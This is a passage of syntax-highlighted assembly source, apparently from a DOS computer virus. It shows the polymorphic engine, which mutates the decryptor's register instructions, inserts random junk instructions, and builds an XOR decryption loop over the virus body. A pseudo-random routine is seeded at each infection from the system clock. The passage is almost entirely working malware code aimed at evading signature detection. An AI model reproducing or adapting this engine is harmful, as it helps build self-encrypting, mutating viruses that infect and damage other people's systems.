        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc2">0bdh</span><span class="sc0">       </span><span class="sc1">; mov bp,xxxx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">0e989h</span><span class="sc0">     </span><span class="sc1">; mov cx,bp</span><span class="sc0">
</span><span class="sc5">siguiente_abajo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">cx_con_dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc2">0b8h</span><span class="sc0">       </span><span class="sc1">; mov ax,xxxx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">0c189h</span><span class="sc0">     </span><span class="sc1">; mov cx,ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cx_acabado</span><span class="sc0">
</span><span class="sc5">cx_con_dx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc2">0bah</span><span class="sc0">       </span><span class="sc1">; mov dx,xxxx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">0d189h</span><span class="sc0">     </span><span class="sc1">; mov cx,dx</span><span class="sc0">
</span><span class="sc5">cx_acabado</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc1">; The modification of the instructions of the decryptor finishes here with</span><span class="sc0">
  </span><span class="sc1">;all changes made: the originals are kept at the beggining of the virus in</span><span class="sc0">
  </span><span class="sc1">;memory. The posible 'final loop' exchange is made when writing the</span><span class="sc0">
  </span><span class="sc1">;decryptor</span><span class="sc0">

  </span><span class="sc1">; Here begins the main zone of the code generator; where it's decided</span><span class="sc0">
  </span><span class="sc1">;what generator to use and random instructions are copied at the</span><span class="sc0">
  </span><span class="sc1">;decryptor.</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">centro_poly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Remaining</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;instructions number</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">sigamos_decriptor</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">acabamos_decryptor</span><span class="sc0">      </span><span class="sc1">; Checks if finished</span><span class="sc0">
</span><span class="sc5">sigamos_decriptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">@End_ant</span><span class="sc4">-</span><span class="sc5">ant_debug</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@cont_decrr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@call_decryptgen</span><span class="sc0">
</span><span class="sc5">@cont_decrr</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; If we have 1, 2 or 3 bytes remaining</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@call_inst_1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@call_inst_2</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@call_inst_3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; 200h / 80h = 4</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@@call_decryptgen</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@continuemos</span><span class="sc0">        </span><span class="sc1">; To avoid the loop from going</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;out of range</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loop_site</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@@call_decryptgen</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc2">10d</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">@@call_decryptgen</span><span class="sc0">

</span><span class="sc5">@continuemos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">           </span><span class="sc1">; randomly, place 3 bytes instr,</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;2, routine...</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@trestipos</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@call_inst_4</span><span class="sc0">
</span><span class="sc5">@@call_inst_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">centro_poly</span><span class="sc0">
</span><span class="sc5">@@call_inst_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">centro_poly</span><span class="sc0">

</span><span class="sc5">@@trestipos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@inst_2odec</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@call_sub</span><span class="sc0">
</span><span class="sc5">@@call_inst_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">centro_poly</span><span class="sc0">
</span><span class="sc5">@@inst_2odec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">     </span><span class="sc1">; Low probability</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@call_inst_2</span><span class="sc0">
</span><span class="sc5">@@call_decryptgen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_instruction</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">centro_poly</span><span class="sc0">
</span><span class="sc5">@@call_inst_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">@fix1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">centro_poly</span><span class="sc0">
</span><span class="sc5">@@call_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc5">@End_ant</span><span class="sc4">-</span><span class="sc5">ant_debug</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@fix1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">  </span><span class="sc1">; Long non fixed size</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">centro_poly</span><span class="sc0">             </span><span class="sc1">;routine</span><span class="sc0">


</span><span class="sc5">acabamos_decryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">instrsize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">instr_end</span><span class="sc4">-</span><span class="sc5">instr_start</span><span class="sc0">

</span><span class="sc5">instr_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

  </span><span class="sc1">; Decryptor instructions list; divided into five-bytes blocks.</span><span class="sc0">

</span><span class="sc5">instrucciones</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc5">Another_BP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">         </span><span class="sc1">; variable ( junk gen )</span><span class="sc0">
</span><span class="sc1">;5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">

</span><span class="sc1">;A</span><span class="sc0">
</span><span class="sc5">loop_dec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">00d</span><span class="sc0">
</span><span class="sc5">encrypt_val</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc1">;F</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loop_dec</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">


</span><span class="sc5">instr_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;*******************************************</span><span class="sc0">
</span><span class="sc1">;               Decryptor values and data</span><span class="sc0">
</span><span class="sc1">;--------------------</span><span class="sc0">

</span><span class="sc5">Restantes_poly</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">; Remaining instructions counter</span><span class="sc0">
</span><span class="sc5">Numero_instruccion</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Instruction number</span><span class="sc0">
</span><span class="sc5">num_aleat</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1250h</span><span class="sc0">        </span><span class="sc1">; Aleatory number counter</span><span class="sc0">
</span><span class="sc5">variable_inst</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7h</span><span class="sc0">           </span><span class="sc1">; 0111b</span><span class="sc0">
</span><span class="sc5">loop_site</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">           </span><span class="sc1">; Looping allocation Offset</span><span class="sc0">
</span><span class="sc5">bytes_referencia</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">           </span><span class="sc1">; Reference for instructions</span><span class="sc0">


  </span><span class="sc1">; This returns a random number in Ax after making some operations.</span><span class="sc0">

</span><span class="sc5">aleatorio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">num_aleat</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleat2</span><span class="sc0">
</span><span class="sc5">aleat2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">          </span><span class="sc1">; The seed number is stablished in each</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1531h</span><span class="sc0">      </span><span class="sc1">;infection by the date, and modified</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;by the minutes ( but in Al, the less</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">        </span><span class="sc1">;used, to contribute to the slow poly )</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">           </span><span class="sc1">;and hour.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2311h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">num_aleat</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc1">; Instructions generators: the required instructions are generated and</span><span class="sc0">
  </span><span class="sc1">;copied in es:di, which points to the decryptor in memory</span><span class="sc0">

  </span><span class="sc1">; Main generator: Copies a decryptor instruction in es:di, with special</span><span class="sc0">
  </span><span class="sc1">;care for the final loop</span><span class="sc0">

</span><span class="sc5">gen_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@vasmosnos</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@preparar_loop</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@guardar_paraloop</span><span class="sc0">
</span><span class="sc5">@gen_ya</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">instrucciones</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bytes_referencia</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bytes_referencia</span><span class="sc4">],</span><span class="sc2">5h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; copy the instruction</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc2">5h</span><span class="sc0">  </span><span class="sc1">; remaining instrs</span><span class="sc0">


</span><span class="sc5">@vasmosnos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@guardar_paraloop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loop_site</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@gen_ya</span><span class="sc0">

</span><span class="sc5">@preparar_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc0">     </span><span class="sc1">; fc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">loop_site</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">num_aleat</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@make_a_jnz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@gen_ya</span><span class="sc0">
</span><span class="sc5">@make_a_jnz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">7549h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@gen_ya</span><span class="sc0">

  </span><span class="sc1">; Generator ----&gt; One byte length instructions generator</span><span class="sc0">

</span><span class="sc5">inst_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@cont_a1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@cont_a1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_2</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@cont_a2_1_1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
